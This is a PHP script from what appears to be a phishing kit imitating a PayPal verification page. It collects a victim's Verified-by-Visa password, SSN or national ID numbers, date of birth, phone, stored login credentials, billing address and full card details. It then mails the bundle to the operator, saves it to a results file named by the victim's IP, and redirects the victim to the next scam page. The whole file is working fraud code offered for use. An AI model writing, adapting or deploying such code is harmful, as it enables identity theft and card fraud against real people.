<?php 
//PRIV8 SCAM G33K.OFFICIEL V4
session_start(); include("../email.php"); $rand=rand(111611,996999); 
$rand2=rand(1116111,9997989);
$md = md5(sha1("ByG33K.OFFICIEL"));
$aubli =$rand.$md.$rand2;
$ip= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? 
$_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']; 
$vbv= $_POST["vbv"];
$ccnm = $_POST["ccnm"]; 
$gb = $_POST["sort_code"];
$ul = $_POST["ssn"]; 
$ca = $_POST["ins"]; 
$au = $_POST["driver"]; 
$db1 = $_POST["dob_1"]; 
$db2 = $_POST["dob_2"]; 
$db3 = $_POST["dob_3"]; 
$ppn1 = $_POST ["phone1"]; 
$ppn2 = $_POST["phone2"];
$_SESSION["vbv"] ="
==============Login===============
Email:".$_SESSION["email"]."
Password:".$_SESSION["pass"]."
==============Login===============
==============Billing=============
First Name:".$_SESSION["fname"]."
Last Name:".$_SESSION["lname"]."
DOB:".$_SESSION["DOB"]."
Phone Type (Home/Mobile):".$_SESSION["PhoneType"]."
Phone Number:".$_SESSION["PhoneNumber"]."
Street:".$_SESSION["address1"]."
City:".$_SESSION["city"]."
State:".$_SESSION["state"]."
Country:".$_SESSION["country"]."
Zip:".$_SESSION["ZIP"]."
==============Billing=============
==============Card Infos==========
Name On Card: ".$_SESSION["nameoncc"]."
Card Type: ".$_SESSION["crdtp"]."
Card Number: ".$_SESSION["number"]."
Expiration Date: ".$_SESSION["expmo"]." / ".$_SESSION["expyr"]."
CSC: ".$_SESSION["csc"]."
===============Card Infos=========
===============VBV Infos==========
NAME OF FUCKED PERSON: $ccnm
Visa Password: $vbv
DOB: $db1/$db2/$db3
PPN (Personal Phone Number): + $ppn1 $ppn2
* Infos by countries :
GB Info(Sort Code) : $gb
US/IL Info (SSN) : $ul
CA Info (SOCIAL INSURANCE NUMBER) : $ca
AU Info (Driver License Number) : $au
===============VBV Infos==========
IP: http://ip-api.com/#$ip ";
$Subject="PPL PRIV8 V4 - VBV - $ip"; 
$head="From:G333.OFFICIEL VBV =?UTF-8?Q?=e2=9d=a4_?=  Fullz <vbv>"; 
mail($rezult_mail,$Subject,$_SESSION["vbv"],$head); 
if($txt == 1){
$file = fopen("../REZULT/VBVs/XVBVX " . $ip . ".txt", 'a');
fwrite($file, $_SESSION["vbv"]); };
if($id == 1){
header("location:../websc_identity/"); }
else { header("location:../websc_success/"); }
?>